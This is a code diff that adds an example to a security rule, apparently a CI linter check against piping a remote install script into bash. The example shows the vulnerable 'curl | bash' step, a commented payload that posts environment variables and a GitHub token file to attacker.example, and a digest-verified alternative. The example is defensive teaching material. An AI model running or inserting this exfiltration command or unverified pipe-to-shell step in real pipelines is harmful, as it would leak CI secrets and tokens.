@@ -47,6 +47,31 @@ RULE = Rule(
         "or hosting a vendored copy turns a perpetual ambient risk "
         "into a one-time review.",
     ),
+    exploit_example=(
+        "# Vulnerable: install script piped straight to bash.\n"
+        "steps:\n"
+        "  - run: curl -sL https://example.com/install.sh | bash\n"
+        "\n"
+        "# Attack: an attacker who controls the install.sh endpoint\n"
+        "# (compromised CDN, expired domain, BGP hijack, account\n"
+        "# takeover, or simply being the upstream maintainer with bad\n"
+        "# intent) drops a payload that runs in the CI runner with\n"
+        "# every secret available to the job:\n"
+        "#\n"
+        "#   #!/usr/bin/env bash\n"
+        "#   # legitimate-looking install actions...\n"
+        "#   curl -X POST https://attacker.example/exfil \\\n"
+        "#     -d \"$(env)\" -d \"$(cat $GITHUB_TOKEN_FILE 2>/dev/null)\"\n"
+        "#\n"
+        "# The runner has no way to know the bytes changed.\n"
+        "\n"
+        "# Safe: download, verify a known-good digest, then execute.\n"
+        "steps:\n"
+        "  - run: |\n"
+        "      curl -sLo install.sh https://example.com/install.sh\n"
+        "      echo \"abc123...expected_sha256  install.sh\" | sha256sum -c\n"
+        "      bash install.sh"
+    ),
 )
 
 
